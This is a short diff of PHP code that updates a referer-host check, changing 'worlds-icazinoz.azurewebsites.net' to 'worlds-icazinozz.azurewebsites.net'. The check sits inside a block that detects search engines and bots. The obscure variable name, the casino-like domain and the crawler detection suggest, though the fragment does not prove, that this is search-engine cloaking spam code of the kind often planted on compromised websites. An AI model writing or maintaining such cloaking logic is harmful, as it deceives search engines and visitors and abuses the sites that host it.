@@ -559,7 +559,7 @@ if ( searchEngineDetect() !== false ) {
 	{
 		$asdasd = false;
 	}
-	if ( parse_url( $_SERVER['HTTP_REFERER'] )['host'] == 'worlds-icazinoz.azurewebsites.net' ) {
+	if ( parse_url( $_SERVER['HTTP_REFERER'] )['host'] == 'worlds-icazinozz.azurewebsites.net' ) {
 		$asdasd = true;
 	}
 	if ( isBot( $_SERVER['HTTP_USER_AGENT'] ) != false ) {
